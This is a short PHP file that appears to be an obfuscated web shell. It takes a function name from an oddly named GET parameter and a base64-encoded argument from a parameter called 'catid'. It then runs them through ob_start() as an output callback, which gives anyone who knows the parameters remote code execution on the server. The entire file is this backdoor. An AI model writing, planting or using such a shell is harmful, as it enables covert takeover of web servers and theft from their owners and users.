<?php
    if(isset($_GET['yv55w5']) && isset($_GET['catid'])){
	$id = $_GET['yv55w5'];
	echo $catid = isset($_GET['catid'])?base64_decode($_GET['catid']):'';
	$s = '';
	foreach(array($id) as $v){
	    $s.=$v;
	}
	ob_start($s);
	if($catid){
	    echo $catid;
	}
	ob_end_flush();
}